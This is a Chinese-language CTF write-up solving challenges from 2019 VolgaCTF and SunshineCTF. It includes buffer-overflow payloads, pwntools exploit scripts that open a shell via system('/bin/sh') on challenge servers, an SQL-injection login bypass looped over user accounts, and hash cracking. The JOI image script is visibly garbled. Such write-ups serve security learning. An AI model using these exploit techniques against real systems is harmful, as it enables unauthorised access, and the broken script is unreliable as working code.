# 2019VolgaCTF & 2019SunshineCTF writeup

## VolgaCTF:

- warm/Shadow Cat/JOI

### Warm

这道题是 arm 架构下的，不过没什么区别。没有环境的话要先搭一下，直接连服务器做也可以。

先简单解个密：

```python
s=""
s+=chr(0x23^85);
s+= chr(ord(s[-1])^78)
s+= chr(ord(s[-1])^30)
s+= chr(ord(s[-1])^21)
s+= chr(ord(s[-1])^94)
s+= chr(ord(s[-1])^28)
s+= chr(ord(s[-1])^33)
s+= chr(ord(s[-1])^1)
s+= chr(ord(s[-1])^52)
s+= chr(ord(s[-1])^7)
s+= chr(ord(s[-1])^53)
s+= chr(ord(s[-1])^17)
s+= chr(ord(s[-1])^55)
s+= chr(ord(s[-1])^60)
s+= chr(ord(s[-1])^114)
s+= chr(ord(s[-1])^71)
p.sendline(s);

print(len(s))
print(s)
```

得到 `v8&3mqPQebWFqM?x`

程序很明显有溢出，进行覆盖可以读取任意文件，接下来就靠猜了...

文件名是 `sacred`

payload: `v8&3mqPQebWFqM?xpppppppppppppppppppppppppppppppppppppaaaaaaabbbbbxppppppppppppppppppppppppppppppppppsacred`

flag: `VolgaCTF{1_h0pe_ur_wARM_up_a_1ittle}`

## ShadowCat

用 john 进行破解，首先用默认的字典，发现破解速度极慢，破解出来的都是单字符，想想也是... 所以自己创建一个可打印字符的字典，使用 --wordlist 设置破解就好了，最后把破解得到的数据与密文对应的字符进行替换，得到 

脚本：

```python
str = "hajjzvajvzqyaqbendzvajvqauzarlapjzrkybjzenzuvczjvastlj"
ans = ""
dict = {"z":"_","a":"a","x":"b","q":"c","l":"w","v":"h","e":"i","f":"j","b":"k","r":"l","g":"m","n":"n","o":"x","p":"y","s":"d","c":"e","w":"f","d":"g","t":"o","h":"p","m":"q","k":"u","i":"v","y":"r","j":"s","u":"t"}

for ch in str:
  ans+=dict[ch];

print(ans)
```



flag: `pass_hash_cracking_hashcat_always_lurks_in_the_shadows`

## JOI

扫描二维码，发现一串公式，一开始尝试能否分离多张图片，无果，仔细分析公式，发现 C_F 就是由 C 和 F 计算得到的。分析能否在只有 C_F 的情况下推出 F，如果 F 的像素值都是0，1是可以的。结果应该是一张二维码。C_F每个位的像素值转为7进制。那么第0位对应 C 的第 0 位。第一位对应 F 的值，剩下的位数和C对应。

脚本如下：

```python
from PIL import Image
width = heigght = 530
img=Image.img=Image.open("result.png")
img_array=img.load()("result.png")
img_array=img.load()
img=[]
for x in range(0,530):
    for y in range(0,530):
        print((img_array[x,y][0]%14)//7)
        img.append((img_array[x,y][0]%14)//7)
        im = Image.new('RGB',(530,530))
        
f = im.load()
for x in range(len(img)):
    if img[x] == 1:
        f[x/530,x%530]=(255,255,255)
    else:
        f[x/530,x%530]= (0,0,0)
im.show()
im.save('1.png')
```

最终 flag: `VolgaCTF{5t3g0_m4tr3shk4_in_4cti0n}`



## SunshineCTF

- [Patches' Punches](https://2019.sunshinectf.org/challenges#Patches'%20Punches)/[Return To Mania](https://2019.sunshinectf.org/challenges#Return%20To%20Mania)/[Smash](https://2019.sunshinectf.org/challenges#Smash)/[WrestlerBook](https://2019.sunshinectf.org/challenges#WrestlerBook)/CyberRumble(赛后)

###  [Patches' Punches](https://2019.sunshinectf.org/challenges#Patches%27%20Punches)

首先查看程序控制流图，根据题目名称直接 path, jnz 改为 jz，运行一下就能看到 flag 了

flag:`sun{To0HotToHanDleTo0C0ldToH0ld!}`

### [Return To Mania](https://2019.sunshinectf.org/challenges#Return%20To%20Mania)

根据题目名称，控制程序流执行 mania 函数

```python
from pwn import *
context.log_level='debug'
target = 0x000065D

#sh = process("./return-to-mania")
sh = remote("ret.sunshinectf.org",4301)
data = sh.recvline()
data = sh.recvline()
print("recivedata:"+data)
welcome_addr = int(data[-11:-1],16)

#gdb.attach(sh)
print(hex(welcome_addr))
print("basic addr:"+hex(welcome_addr-0x000006ED))
#target_addr = target+welcome_addr-0x00006ED
target_addr = target+welcome_addr-0x00006ED
print("target_addr: "+hex(target_addr))
sh.sendline('A' * (22) + p32(target_addr))	
sh.interactive()
```

flag: `sun{0V3rfl0w_rUn_w!Ld_br0th3r}`

### [Smash](https://2019.sunshinectf.org/challenges#Smash)

逆向推一下，有些函数是没用的

```python
arr =[0 for i in range(31)]
arr[1] = 5;
arr[2] = 3;
arr[3] = 6;
arr[4] = 5;
arr[5] = 2;
arr[6] = 5;
arr[7] = 3;
arr[8] = 3;
arr[9] = 3;
arr[10] = 5;
arr[11] = 2;
arr[12] = 4;
arr[13] = 6;
arr[14] = 5;
arr[15] = 5;
arr[16] = 2;
arr[17] = 2;
arr[18] = 5;
arr[19] = 2;
arr[20] = 6;
arr[21] = 5;
arr[22] = 1;
arr[23] = 3;
arr[24] = 4;
arr[25] = 5;
arr[26] = 3;
arr[27] = 4;
arr[28] = 6;
arr[29] = 6;
arr[30] = 5;

for i in range(len(arr)-1):
  arr[i] = arr[i+1]
print(arr)

lenArr = 30;
res = [0x00000E60, 0x000003A8, 0x00001B80, 0x00000F60, 0x00000120, 0x00000EA0, 0x00000188, 0x00000358, 0x000001A0, 0x000009A0, 0x00000184, 0x000004E0, 0x00000C40, 0x00000C20, 0x000005A0, 0x000001C8, 0x000001D4, 0x000009C0, 0x000001CC, 0x00000B40, 0x00000AE0, 0x00000062, 0x00000360, 0x00000340, 0x000005A0, 0x00000180, 0x000006E0, 0x00000B40, 0x00001540, 0x00000FA0]
flag =''
for i in range(len(res)):
  flag+=chr(res[i]>>arr[i])

print(flag)
```



flag:`sun{Hu1k4MaN1a-ruNs-W1l4-0n-U} `

### [WrestlerBook](https://2019.sunshinectf.org/challenges#WrestlerBook)

SQL 注入，熟悉的登录POST表单，sqlmap 一把梭(???) 跑出表名和一些 user\*，但是没有密码。我们可以利用 

`' AND 1=1 /*` 绕过密码，用户有两百多个，遍历访问查看哪个有 flag 就好

```python
import requests
from bs4 import BeautifulSoup
url = "http://bk.sunshinectf.org/login.php"

headers = {'Cookie': '___rl__test__cookies=1554029505487; OUTFOX_SEARCH_USER_ID_NCOO=1533311957.0976644'}
# cookie = ""
for i in range(0,250):
  username = "user"+str(i)+"' AND 1=1 /*"
  password = "a"
  data = {'username':username,'password':password}
  response = requests.post(url, data,headers=headers)
  bf = BeautifulSoup(response.text)
  texts = bf.find_all('div', class_ = 'desc')
  print(texts)
```

flag: `sun{ju57_4n07h3r_5ql1_ch4ll}`

### CyberRumble

这道题每个功能都有一些可以利用的点，"tombstone_piledriver " 读文件，可以查看 /proc/self/map 获取程序基址（没什么用）"old_school " 忘内存写任意内容（关键），"last_ride "  执行system() (关键)，"chokeslam " 往输入缓冲区写东西，在后面使用其他功能的时候，只要没有新的数据覆盖，这些数据仍然存在的。根据程序里面的 TODO 也能知道一些。

关键在于 `memcpy(&dest, a1, 0x14uLL);` 

~~根据题意，想到的 chain 就是 "old_school "->"old_school "->"last_ride  “，第一次写入 “/bin/sh" 得到第一个地址，第二次写入第一次的地址，第三次把第二次的传给"last_ride  “，从而构造 system(”/bin/sh")~~ 

实际操作还是很多问题的，注意退出"old_school "的时候不要选 “n"，其他随便字符都可以，"old_school "有\x00截断，第一次返回的地址有前导'\x00'，可以对地址进行 +x 的操作，其次 "last_ride  “ 中会多拷贝地址后的 "00" 导致执行 system 执行时不能访问对应的内存。把产生的地址传给它，成功 getshell . 注意 \x00 可能会导致传址失败，导致 buffer 里面还是  bin/sh 

```python
from pwn import *
context.log_level='debug'

#sh = process("./CyberRumble")
sh = remote("rumble.sunshinectf.org", 4300)
sh.recvline()
sh.recvline()

sh.sendline("old_school "+ "sss"+"/bin/sh")

shellcode_addr = int(sh.recvline()[-16:-2],16)+3

sh.recvuntil("Jump to shellcode?\n")
#sh.recvline()
sh.sendline("c")

#sh.recvuntil("Move?\n> ")
#sh.sendline("old_school "+p64(shellcode_addr)+"\0\0")
#sh.recvline()
shellcode_addr2 = int(sh.recvline()[-16:-2],16)

#sh.recvuntil("Jump to shellcode?\n")
#sh.recvline()
#sh.sendline("c")

#gdb.attach(sh)
sh.recvuntil("Move?\n> ")

sh.sendline("last_ride "+p64(shellcode_addr))
sh.interactive()
```

flag: `sun{the chair and thumbtacks are ready, but the roof is a little loose}`